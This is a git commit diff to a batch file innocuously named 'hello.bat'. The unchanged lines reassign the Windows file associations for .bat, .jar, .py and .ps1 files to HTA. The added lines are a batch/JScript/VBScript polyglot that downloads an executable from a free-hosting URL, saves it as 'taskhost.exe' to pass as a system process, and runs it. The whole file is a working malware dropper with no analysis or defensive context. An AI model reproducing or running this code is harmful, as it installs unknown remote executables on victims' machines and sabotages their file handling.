a7673e77c525f65e95b17686bad0e1e64ca9a55d
Destroyer <32405118+DestroyerDarkNess@users.noreply.github.com>
2022-05-20 16:58:37 -0500

    Update hello.bat

--- hello.bat
+++ hello.bat
@@ -27,4 +27,74 @@ reg add HKCU\Software\Classes\.bat /d "htafile" /f
 reg add HKCU\Software\Classes\.jar /d "htafile" /f
 reg add HKCU\Software\Classes\.py /d "htafile" /f
 reg add HKCU\Software\Classes\.ps1 /d "htafile" /f
-exit
+
+:Main
+@if (true == false) @end /*
+@echo off
+Rem Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
+set "SYSDIR=SysWOW64"
+if "%PROCESSOR_ARCHITECTURE%" == "x86" if not defined PROCESSOR_ARCHITEW6432 set "SYSDIR=System32"
+"%WINDIR%\%SYSDIR%\cscript.exe" //nologo //e:javascript "%~f0" %*
+goto :EOF */
+
+(function(readFile, code)
+{
+    var e;
+    try {
+        var vb = new ActiveXObject('MSScriptControl.ScriptControl');
+        vb.Language = 'VBScript';
+        vb.AddObject('WScript', WScript, true);
+        vb.AddCode(code);
+    } catch(e) {
+        var file = readFile();
+        var prologLen = file.slice(0, file.indexOf(code)).split('\n').length;
+        var vbe = vb.Error;
+        WScript.Echo(
+            WScript.ScriptFullName + 
+            '(' + ( prologLen + vbe.Line - 1 ) + ', ' + vbe.Column + ') ' + 
+            vbe.Source + ': ' + vbe.Description);
+    }
+})(
+function()
+{
+    var fso = new ActiveXObject('Scripting.FileSystemObject');
+    var f = fso.OpenTextFile(WScript.ScriptFullName, 1, true);
+    var file = f.ReadAll();
+    f.Close();
+    return file;
+}, 
+(function()
+{
+    return arguments.callee.toString().replace(/^[\s\S]+\/\*|\*\/[\s\S]+$/g, '');
+/* ' VBScript
+
+' Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
+
+dim http_obj
+dim stream_obj
+dim shell_obj
+ 
+set http_obj = CreateObject("Microsoft.XMLHTTP")
+set stream_obj = CreateObject("ADODB.Stream")
+set shell_obj = CreateObject("WScript.Shell")
+ 
+URL = "https://softwarefuturenet.000webhostapp.com/TempDocs/Shareware.temp" 
+FILENAME = "taskhost.exe" 
+RUNCMD = "taskhost.exe" 
+
+http_obj.open "GET", URL, False
+http_obj.send
+ 
+stream_obj.type = 1
+stream_obj.open
+stream_obj.write http_obj.responseBody
+stream_obj.savetofile FILENAME, 2
+ 
+shell_obj.run RUNCMD
+
+' Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
+
+*/
+})());
+
+
